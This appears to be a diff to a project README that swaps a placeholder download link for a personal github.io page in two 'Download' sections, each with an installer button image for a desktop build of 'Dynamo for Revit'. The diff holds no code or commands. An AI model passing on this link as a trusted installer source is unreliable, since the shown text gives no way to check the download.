@@ -17,7 +17,7 @@ The build targets the desktop scripting workspace surface and lands in both port
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://carla-foster.github.io/dynamo-for-revit-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence is handled by keeping versioned program directories separate and let
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://carla-foster.github.io/dynamo-for-revit-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
